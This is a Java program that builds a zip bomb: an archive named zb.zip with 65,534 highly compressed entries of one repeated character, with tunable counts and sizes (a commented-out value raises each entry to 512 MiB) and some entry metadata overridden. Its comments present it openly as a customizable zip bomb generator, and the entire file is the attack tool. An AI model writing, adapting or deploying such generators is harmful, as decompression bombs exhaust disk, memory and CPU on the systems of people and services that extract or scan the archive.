package com.test.zb;

import org.apache.commons.compress.archivers.zip.Zip64Mode;
import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
import org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream;
import org.apache.commons.compress.archivers.zip.ZipMethod;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.file.attribute.FileTime;

class ZbGenerator {
    /*
    Environment Variables
    Change them to customize your zip bomb
     */
    public static final int fileCount = 65534;
    // size of each file inside the archive
    public static final long fileSize = 65536;//536870912;
    // repeating character inside each file
    // Note: It must be an ascii character (int from 0 to 127)
    public static final int fileChar = 'a';
    // Encoding for file names and comments
    public static final String encoding = "UTF-8";
    // zip64 can contain more files inside the archive but less compatible
    public static final boolean useZip64 = false;
    // comment for the archive file
    public static final String comment = "";
    public static int compressMethod = ZipMethod.DEFLATED.getCode();
    public static final String outFile = "zb.zip";

    /*
    .
    .
    .
    .
    .
    .
    .
     */

    private static InputStream createSimulatedInputStream() {
        return new InputStream() {
            private long index = 0;

            private boolean checkEof() {
                return index >= fileSize;
            }

            @Override
            public final int read() {
                index++;
                return checkEof() ? -1 : fileChar;
            }

            @Override
            public final int read(byte[] b, int off, int len) {
                int c = 0;
                for (int i = off; i < len; i++, c++, index++)
                    b[i] = fileChar;
                return checkEof() ? -1 : c;
            }
        };
    }

    static void transferStream(InputStream is, OutputStream os) throws IOException {
        final byte[] buf = new byte[8192];
        int i;
        while ((i = is.read(buf, 0, 8192)) >= 0) {
            os.write(buf, 0, i);
            os.flush();
        }
    }

    public static void main(String... args) throws Exception {
        try (ZipArchiveOutputStream zos = new ZipArchiveOutputStream(new FileOutputStream(outFile, false))) {
            zos.setUseZip64(useZip64 ? Zip64Mode.Always : Zip64Mode.Never);
            zos.setEncoding(encoding);
            zos.setLevel(9);
            zos.setMethod(compressMethod);
            zos.setComment(comment);
            for (int i = 0; i < fileCount; i++) {
                zos.putArchiveEntry(new ZEntry(i));
                transferStream(createSimulatedInputStream(), zos);
                zos.closeArchiveEntry();
            }
            zos.flush();
        }
    }

    private static final class ZEntry extends ZipArchiveEntry {
        ZEntry(int id) {
            super(String.valueOf(id));
        }

        @Override
        public final long getTime() {
            return 0;
        }

        @Override
        public final int getPlatform() {
            return PLATFORM_FAT;
        }

        @Override
        public final int getMethod() {
            return compressMethod;
        }

        @Override
        public final long getCompressedSize() {
            return 1024L;
        }

        @Override
        public final String getComment() {
            return null;
        }

        @Override
        public final FileTime getCreationTime() {
            return null;
        }

        @Override
        public final FileTime getLastModifiedTime() {
            return null;
        }

        @Override
        public final FileTime getLastAccessTime() {
            return null;
        }
    }
}